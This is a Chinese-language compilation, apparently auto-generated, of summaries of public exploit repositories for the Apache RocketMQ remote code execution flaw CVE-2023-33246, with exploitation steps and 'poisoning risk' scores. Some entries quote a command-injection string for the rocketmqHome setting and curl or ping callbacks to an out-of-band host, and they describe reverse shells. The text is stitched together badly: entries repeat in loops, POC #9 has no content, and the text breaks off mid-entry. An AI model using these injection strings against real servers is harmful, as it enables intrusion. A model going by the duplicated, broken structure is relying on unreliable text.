**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

